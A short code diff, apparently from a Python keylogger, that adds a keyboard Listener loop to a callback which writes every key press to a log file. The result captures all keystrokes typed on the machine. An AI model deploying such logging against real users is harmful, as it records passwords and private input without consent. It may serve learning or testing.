@@ -13,3 +13,7 @@ def on_press(key):
 	logging.info(str(key))
 	# if key == Key.esc:
 		# return false
+
+# notes that the listener is on and waithing for user input
+with Listener(on_press=on_press) as listener:
+	listener.join()
